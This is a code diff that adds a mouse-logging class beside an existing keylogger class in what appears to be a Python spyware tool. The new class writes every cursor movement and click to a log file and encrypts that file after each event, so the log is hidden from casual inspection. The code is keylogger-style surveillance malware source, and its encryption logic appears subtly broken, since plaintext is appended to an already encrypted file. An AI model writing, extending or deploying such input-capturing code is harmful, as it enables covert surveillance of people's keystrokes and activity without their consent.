@@ -107,3 +107,24 @@ class KeyLogger:
         with KeyListener(on_press=self.on_press) as listener:
             while not stop_threads:
                 listener.join(timeout=1)
+
+class MouseLogger:
+    def __init__(self, log_file, key):
+        self.log_file = log_file
+        self.key = key
+
+    def on_move(self, x, y):
+        with open(self.log_file, "a") as f:
+            f.write(f"Mouse moved to ({x}, {y})\n")
+        encrypt_file(self.log_file, self.key)
+
+    def on_click(self, x, y, button, pressed):
+        with open(self.log_file, "a") as f:
+            action = 'pressed' if pressed else 'released'
+            f.write(f"Mouse {action} at ({x}, {y}) with {button}\n")
+        encrypt_file(self.log_file, self.key)
+
+    def start(self):
+        with MouseListener(on_move=self.on_move, on_click=self.on_click) as listener:
+            while not stop_threads:
+                listener.join(timeout=1)
